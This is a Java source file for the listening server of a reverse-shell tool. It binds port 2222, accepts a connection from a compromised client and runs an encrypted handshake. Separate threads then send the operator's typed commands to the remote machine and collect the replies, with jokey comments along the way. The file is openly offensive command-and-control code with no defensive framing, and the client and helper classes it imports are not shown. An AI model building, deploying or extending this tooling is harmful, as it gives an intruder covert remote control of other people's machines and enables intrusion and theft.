package obs1d1anc1ph3r.reverseshell.server;

import obs1d1anc1ph3r.reverseshell.server.utils.ServerSetup;
import obs1d1anc1ph3r.reverseshell.server.responsehandling.ResponseHandler;
import obs1d1anc1ph3r.reverseshell.server.commandhandling.CommandSender;
import java.io.*;
import java.net.*;
import java.util.logging.*;
import obs1d1anc1ph3r.reverseshell.server.encryption.SecureConnection;

public class ReverseShellServer {

	private static final int SERVER_PORT = 2222;
	private static final Logger logger = Logger.getLogger(ReverseShellServer.class.getName());
	private ServerSocket serverSocket;
	private Socket clientSocket;
	private DataInputStream dataIn;
	private DataOutputStream dataOut;
	private BufferedReader userInput;
	private Thread outputReceiver;
	private Thread inputHandler;
	private byte[] encryptionKey;
	private byte[] nonce;

	public static void main(String[] args) {
		ReverseShellServer server = new ReverseShellServer();
		server.start();
	}

	public void start() {
		try {
			ServerSetup serverSetup = new ServerSetup(SERVER_PORT);
			serverSetup.setupServer(); //Server port and stuff
			this.serverSocket = serverSetup.getServerSocket(); //Server socket
			this.clientSocket = serverSetup.waitForConnection(); //Client socket
			this.dataIn = serverSetup.getDataInputStream(); //Data in stream
			this.dataOut = serverSetup.getDataOutputStream(); //Data out stream
			this.userInput = serverSetup.getUserInput(); //User input stream thing

			SecureConnection secureConnection = new SecureConnection(dataIn, dataOut);
			this.encryptionKey = secureConnection.establishSecureConnection(); //Do the cool handshake so you know they're a homie

			outputReceiver = new Thread(new ResponseHandler(dataIn, dataOut, clientSocket, encryptionKey)); //Handle those responses
			outputReceiver.start();

			inputHandler = new Thread(new CommandSender(dataOut, userInput, encryptionKey, nonce)); //Send those commands like a dom
			inputHandler.start();

		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Server error: " + e.getMessage(), e);
		}
	}

	public void cleanup() { //Hell yeah
		try {
			if (outputReceiver != null && outputReceiver.isAlive()) {
				outputReceiver.interrupt();
			}
			if (inputHandler != null && inputHandler.isAlive()) {
				inputHandler.interrupt();
			}
			closeResources();
		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Error during cleanup: " + e.getMessage(), e);
		}
	}

	private void closeResources() throws IOException { //Wooooooo, I'm almost done writing comments
		try { //I was not almost done
			if (userInput != null) {
				userInput.close();
			}
			if (dataIn != null) {
				dataIn.close();
			}
			if (dataOut != null) {
				dataOut.close();
			}
			if (clientSocket != null) {
				clientSocket.close();
			}
			if (serverSocket != null) {
				serverSocket.close();
			}
		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Error closing resources: " + e.getMessage(), e);
			throw e;
		}
	}
}
